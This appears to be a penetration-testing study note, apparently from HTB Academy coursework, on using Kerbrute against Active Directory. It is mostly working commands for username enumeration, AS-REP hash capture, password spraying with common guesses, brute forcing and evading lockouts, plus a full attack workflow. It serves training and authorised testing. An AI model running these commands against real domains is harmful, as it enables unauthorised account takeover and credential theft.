# Kerbrute

**Tags:** `#kerbrute` `#kerberos` `#activedirectory` `#userenumeration` `#bruteforce` `#passwordspray` `#auth`

Fast Kerberos pre-authentication brute-forcer and user enumerator for Active Directory. Uses Kerberos AS-REQ to validate usernames and test passwords — faster and stealthier than LDAP-based enumeration, and doesn't require any domain credentials to enumerate valid users.

**Source:** https://github.com/ropnop/kerbrute
**Install:**

```bash
# Pre-built binary (easiest)
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64 -O /usr/local/bin/kerbrute
chmod +x /usr/local/bin/kerbrute

# Build from source
git clone https://github.com/ropnop/kerbrute.git
cd kerbrute && make all
mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
```

> [!note] Kerbrute requires network connectivity to the DC on port **TCP/UDP 88** (Kerberos). Ensure DNS resolves the domain or specify the DC IP directly with `--dc`.

> [!note] **See also** — [[Services/Active Directory/Kerberos|Kerberos]] Enumeration section.
> Also used in [[Class notes/HTB Academy/CPTS v2 (claude)/Login Brute Forcing|Login Brute Forcing]] (CPTS v2).

---

## Commands

| Command | Description |
|---|---|
| `userenum` | Enumerate valid domain usernames |
| `passwordspray` | Spray a single password against valid users |
| `bruteuser` | Brute force a single user |
| `bruteforce` | Brute force from a `user:pass` combo file |
| `version` | Show version |

---

## Core Flags

| Flag | Description |
|---|---|
| `-d <domain>` | Target domain (e.g. `CORP.LOCAL`) |
| `--dc <IP>` | Domain controller IP (use if DNS not configured) |
| `-o <file>` | Output results to file |
| `-t <n>` | Threads (default 10) |
| `-v` | Verbose — show all attempts including failures |
| `--safe` | Abort **all** threads the instant any account comes back locked-out (stops you locking out the rest) |
| `--delay <ms>` | Delay between attempts in milliseconds |
| `--hash-file <file>` | Save any **AS-REP hashes** captured during `userenum` (pre-auth-disabled accounts); otherwise they're just logged |

---

## How It Works & What It Captures

Kerbrute sends a bare **AS-REQ** (no pre-auth data) per username and reads the KDC's error:

| KDC response | Meaning | Kerbrute verdict |
|---|---|---|
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` | user doesn't exist | invalid — skipped |
| `KDC_ERR_PREAUTH_REQUIRED` | user exists, pre-auth on | **VALID USERNAME** |
| an **AS-REP** (a TGT) comes back | user exists **and pre-auth is OFF** | **VALID + AS-REP hash captured** |

That third case is a free win: `userenum` also **AS-REP roasts** every account with
"Do not require Kerberos pre-authentication" set — feed those to
[[Tools/Auth/hashcat\|hashcat]] `-m 18200` / [[Tools/Auth/john the ripper\|john]]
`--format=krb5asrep`. Save them cleanly with `--hash-file`:

```bash
kerbrute userenum -d CORP.LOCAL --dc 10.10.10.10 usernames.txt \
  -o valid_users.txt --hash-file asrep.hashes
```

> [!note] **Detection footprint** — `userenum` produces AS-REQ traffic (event **4768**) but
> **no bad-password / 4625 logon failures**, which is why it's stealthier than LDAP or
> SMB enumeration. `passwordspray`/`bruteuser`, by contrast, generate Kerberos pre-auth
> **failures (event 4771, code 0x18)** and **increment the lockout counter** — hence `--safe`
> and `--delay`.

---

## User Enumeration

No credentials needed — Kerberos responds differently to valid vs invalid usernames.

```bash
# Enumerate users from a wordlist
kerbrute userenum -d CORP.LOCAL --dc 10.10.10.10 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# Save valid users to file
kerbrute userenum -d CORP.LOCAL --dc 10.10.10.10 usernames.txt -o valid_users.txt

# Use a targeted username list (e.g. generated from LinkedIn OSINT)
kerbrute userenum -d CORP.LOCAL --dc 10.10.10.10 generated_users.txt -o valid_users.txt

# Increase threads for speed
kerbrute userenum -d CORP.LOCAL --dc 10.10.10.10 usernames.txt -t 50 -o valid_users.txt
```

> [!tip] Good username wordlists for AD enumeration:
> - `/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt`
> - `/usr/share/seclists/Usernames/Names/names.txt`
> - Generate domain-format names with **Username Anarchy** from harvested names (LinkedIn, company website, email headers)

---

## Password Spraying

Spray a single password across all valid users. Always do user enumeration first.

```bash
# Basic spray
kerbrute passwordspray -d CORP.LOCAL --dc 10.10.10.10 valid_users.txt 'Password123!'

# Common first sprays
kerbrute passwordspray -d CORP.LOCAL --dc 10.10.10.10 valid_users.txt 'Welcome1'
kerbrute passwordspray -d CORP.LOCAL --dc 10.10.10.10 valid_users.txt 'Company2024!'
kerbrute passwordspray -d CORP.LOCAL --dc 10.10.10.10 valid_users.txt 'Summer2024!'

# Add delay to avoid lockout (--delay in milliseconds)
kerbrute passwordspray -d CORP.LOCAL --dc 10.10.10.10 valid_users.txt 'Password1' --delay 1000

# Use --safe to abort if lockout is detected
kerbrute passwordspray -d CORP.LOCAL --dc 10.10.10.10 valid_users.txt 'Password1' --safe

# Save results
kerbrute passwordspray -d CORP.LOCAL --dc 10.10.10.10 valid_users.txt 'Password1' -o spray_results.txt
```

> [!warning] **Lockout risk** — Kerberos spraying DOES trigger lockout counters. Know the domain lockout threshold before spraying. Default Windows policy locks after 5 bad attempts — spray one password at a time with adequate spacing between rounds. Use `--safe` to detect early signs of triggering lockout.

---

## Brute Force

```bash
# Brute force a single known account
kerbrute bruteuser -d CORP.LOCAL --dc 10.10.10.10 passwords.txt administrator

# Brute force from a user:pass combo file
kerbrute bruteforce -d CORP.LOCAL --dc 10.10.10.10 combos.txt
```

> [!warning] Per-account brute force is high lockout risk. Only use on accounts confirmed to not have lockout (e.g. a service account with lockout disabled, or a test account).

---

## Output

Valid credentials are highlighted in green. Output file format:

```
2024/01/01 12:00:00 >  [+] VALID USERNAME: jsmith@CORP.LOCAL
2024/01/01 12:00:01 >  [+] VALID LOGIN: jsmith:Password123!
```

```bash
# Extract just usernames from output file
grep "VALID USERNAME" valid_users.txt | awk '{print $NF}' | cut -d@ -f1 > clean_users.txt

# Extract cracked creds
grep "VALID LOGIN" spray_results.txt
```

---

## Recommended Workflow

```
1. Generate username list from OSINT (LinkedIn, email format, Username Anarchy)
2. kerbrute userenum → confirm valid usernames without credentials
3. Review valid user list — remove service accounts or high-value targets from spray
4. Check lockout policy if possible (net accounts /domain, CrackMapExec, BloodHound)
5. kerbrute passwordspray with one password — seasonal/company-themed guesses first
6. Wait at least 30 min between spray rounds if lockout threshold is low
7. Use cracked credentials for further enumeration (CME, BloodHound, etc.)
```

> [!note] **Kerbrute vs other spray tools** — Kerbrute is preferred for initial unauthenticated enumeration and spraying. Once you have creds, **CrackMapExec / NetExec** (`--no-bruteforce`) or **Spray** are better for authenticated spraying across subnets.

---

*Created: 2026-03-06*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
